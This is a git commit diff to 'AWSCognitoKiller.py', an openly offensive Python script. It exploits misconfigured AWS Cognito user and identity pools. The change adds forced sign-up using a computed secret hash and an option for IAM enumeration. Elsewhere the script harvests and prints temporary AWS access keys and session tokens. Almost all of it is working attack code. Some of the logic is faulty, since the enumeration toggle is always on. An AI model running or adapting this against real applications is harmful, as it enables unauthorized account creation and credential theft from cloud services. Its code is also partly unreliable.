03d3bf223456c5d1e323fef8661e1948b12614d8
LTiDi2000 <68416745+LTiDi2000@users.noreply.github.com>
2023-01-05 21:55:40 +0700

    Update AWSCognitoKiller.py
    Add:
    - Enable/Disable Auto Enumerate IAM option
    - Add Sign Up Via Client Id + Client Secret When Application Allows SignUp but Need Proper Secret Hash

--- AWSCognitoKiller.py
+++ AWSCognitoKiller.py
@@ -4,26 +4,33 @@ import argparse
 import subprocess
 from subprocess import PIPE
 from enumerate_iam.main import enumerate_iam
+import hashlib
+import hmac
+import base64
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class ExploitAWSCognito:
-	def __init__(self, region, username, password):
+	def __init__(self, region, username, password, isenum):
 		self.region = region
 		self.username = username
 		self.password = password
 		self.clientId = None
 		self.identityPoolId = None
 		self.userPoolId = None
+		self.cognitoSecret = None
+		self.isenum = isenum
 
-	def update(self, clientId=None, identityPoolId=None, userPoolId=None):
+	def update(self, clientId=None, identityPoolId=None, userPoolId=None, cognitoSecret=None):
 		if clientId:
 			self.clientId = clientId
 		if identityPoolId:
 			self.identityPoolId = identityPoolId
 		if userPoolId:
 			self.userPoolId = userPoolId
+		if cognitoSecret:
+			self.cognitoSecret = cognitoSecret
 
 
 	def unauthen_exploit(self):
@@ -35,6 +42,19 @@ class ExploitAWSCognito:
 				self.logProc(f"[+] {self.region}:{self.clientId} - Force SignUp Check stdout: {stdout}")
 			if len(stderr) > 0:
 				self.logError(f"[+] {self.region}:{self.clientId} - Force SignUp Check stderr: {stderr}")
+				if b'is configured for secret but secret was not received' in stderr:
+					if self.cognitoSecret:
+						secret_hash = base64.b64encode(hmac.new(self.cognitoSecret.encode(), msg=f"{self.username}{self.clientId}".encode(), digestmod=hashlib.sha256).digest())
+						r = subprocess.Popen(["aws", "cognito-idp", "sign-up", "--client-id", self.clientId, "--username", self.username, "--password", self.password, "--region", self.region, "--secret-hash", secret_hash], shell=True, stdout=PIPE, stderr=PIPE)
+						stdout, stderr = r.communicate()
+						if len(stdout) > 0:
+							self.logProc(f"[+] {self.region}:{self.clientId} - Force SignUp Check stdout: {stdout}")
+						if len(stderr) > 0:
+							self.logError(f"[+] {self.region}:{self.clientId} - Force SignUp Check stderr: {stderr}")
+							if b"InvalidParameterException" in stderr:
+								self.logError(f"[+] {self.region}:{self.clientId} - Might be vuln but you need to manual add the require attributes!")
+					else:
+						self.logError(f"[+] {self.region}:{self.clientId} - Might be vuln but you need to find cognito application secret and check again! ")
 
 		if self.identityPoolId:
 			r = subprocess.Popen(["aws", "cognito-identity", "get-id", "--identity-pool-id", f"{self.region}:{self.identityPoolId}", "--region", self.region], shell=True, stdout=PIPE, stderr=PIPE)
@@ -64,7 +84,8 @@ class ExploitAWSCognito:
 					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - SessionToken: {SessionToken}")
 					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - Expiration: {Expiration}")
 
-					enumerate_iam(AccessKeyId, SecretKey, SessionToken, self.region)
+					if self.isenum:
+						enumerate_iam(AccessKeyId, SecretKey, SessionToken, self.region)
 
 
 	def logProc(self, message):
@@ -84,17 +105,21 @@ if __name__ == "__main__":
 	parser.add_argument("-identityPoolId", "--identity-pool-id", help = "Identity Pool ID")
 	parser.add_argument("-username", "--username", help = "Username")
 	parser.add_argument("-password", "--password", help = "Password")
+	parser.add_argument("-enumiam", "--enum-iam", help = "Enum IAM")
+	parser.add_argument("-cognitosecret", "--cognito-secret", help = "Cognito Secret")
 
 	args = parser.parse_args()
 	if args.region == None or args.username == None or args.password == None:
 		print(msg)
 		exit()
 
-	exploit_instance = ExploitAWSCognito(args.region.strip(), args.username.strip(), args.password.strip())
+	exploit_instance = ExploitAWSCognito(args.region.strip(), args.username.strip(), args.password.strip(), "enum_iam" in args)
 
 	if args.client_id:
 		exploit_instance.update(clientId=args.client_id.strip())
 	if args.identity_pool_id:
 		exploit_instance.update(identityPoolId=args.identity_pool_id.strip())
+	if args.cognito_secret:
+		exploit_instance.update(cognitoSecret=args.cognito_secret.strip())
 	
 	exploit_instance.unauthen_exploit()
